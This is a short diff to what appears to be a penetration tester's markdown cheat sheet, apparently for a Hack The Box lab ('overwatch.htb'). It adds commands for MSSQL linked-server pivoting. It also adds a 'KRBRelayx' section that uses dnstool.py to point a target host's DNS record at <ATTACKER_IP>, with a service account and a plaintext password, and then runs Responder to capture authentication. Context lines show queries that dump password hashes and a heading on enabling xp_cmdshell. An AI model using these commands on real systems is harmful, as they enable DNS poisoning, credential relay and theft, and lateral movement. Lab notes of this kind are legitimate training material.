@@ -68,11 +68,24 @@ SELECT id, username, password_hash, email FROM <table>;
 SELECT * FROM sys.servers;
 EXEC sp_linkedservers;
 EXEC sp_helplinkedsrvlogin;
+
+enum_links
 ```
 
 ## Query a linked server:
 ```
 SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');
+
+use_link SQL07
+```
+
+## KRBRelayx
+```
+python3 krbrelayx/dnstool.py -u 'overwatch\sqlsvc' -p TI0LKcfHzZw1Vv -r SQL07.overwatch.htb -a add -t A -d <ATTACKER_IP> 10.129.244.81
+
+responder -I tun0 -v
+
+SQL> use_link SQL07
 ```
 
 ## Enable and use xp_cmdshell
